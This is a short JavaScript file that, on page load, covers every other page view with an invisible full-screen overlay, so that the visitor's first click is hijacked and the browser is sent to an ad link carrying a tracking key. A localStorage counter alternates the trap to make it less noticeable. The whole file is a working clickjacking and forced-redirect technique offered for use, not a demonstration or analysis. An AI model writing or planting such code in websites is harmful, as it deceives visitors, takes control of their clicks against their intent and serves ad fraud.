document.addEventListener('DOMContentLoaded', () => {
  // Ensure there's no leftover overlay
  const existingOverlay = document.getElementById('click-overlay');
  if (existingOverlay) existingOverlay.remove();

  // Read click count or default to 0
  let clickCount = parseInt(localStorage.getItem('adClickCount') || '0');

  // Define the ad link
  const adLink = 'https://flirtatiousmoviesbrightly.com/m5u0fm024?key=915f5541df37252209d1ab523c2cc8e5';

  // Define function to increment count and store
  const updateClickCount = () => {
    clickCount++;
    localStorage.setItem('adClickCount', clickCount.toString());
  };

  if (clickCount % 2 === 0) {
    // Odd-numbered user click (0 = 1st click)
    const overlay = document.createElement('div');
    overlay.id = 'click-overlay';
    Object.assign(overlay.style, {
      position: 'fixed',
      top: 0,
      left: 0,
      width: '100vw',
      height: '100vh',
      zIndex: 9999,
      background: 'transparent',
      cursor: 'pointer'
    });

    document.body.appendChild(overlay);

    overlay.addEventListener('click', () => {
      updateClickCount();
      overlay.remove(); // Clean up before leaving
      window.location.href = adLink;
    });
  } else {
    // Even-numbered click — no overlay, just count
    const handleNormalClick = () => {
      updateClickCount();
    };
    document.addEventListener('click', handleNormalClick, { once: true });
  }
});
